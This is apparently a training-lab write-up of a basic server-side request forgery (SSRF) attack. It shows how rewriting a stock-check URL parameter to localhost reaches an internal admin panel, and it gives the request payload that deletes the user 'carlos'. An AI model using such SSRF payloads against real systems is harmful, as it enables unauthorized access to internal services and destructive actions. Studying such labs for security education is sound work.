# Lab: Basic SSRF against the local server

## Description
This lab has a stock check feature which fetches data from an internal system. We can exploit this to access the local admin interface.

## Analysis
The application has a `stockApi` parameter that takes a URL.

```text
POST /product/stock
stockApi=http://stock.weliketoshop.net:8080/details?productId=1&storeId=1
```

By changing the `stockApi` to `http://localhost/admin`, we can make the server request its own administrative interface, which is normally protected by access controls that only allow local access.

## Exploitation
The goal is to delete the user `carlos`.

### Steps
1. Intercept the stock check request.
2. Change the `stockApi` parameter to: `http://localhost/admin`
3. Observe the response, which now shows the admin panel.
4. Find the URL to delete carlos: `/admin/delete?username=carlos`.
5. Update the `stockApi` to: `http://localhost/admin/delete?username=carlos`.
6. Send the request.

## Payload
```text
stockApi=http://localhost/admin/delete?username=carlos
```

## Takeaways
- SSRF allows an attacker to cause the server-side application to make requests to an arbitrary domain.
- Internal services often lack authentication because they assume the network perimeter is secure.
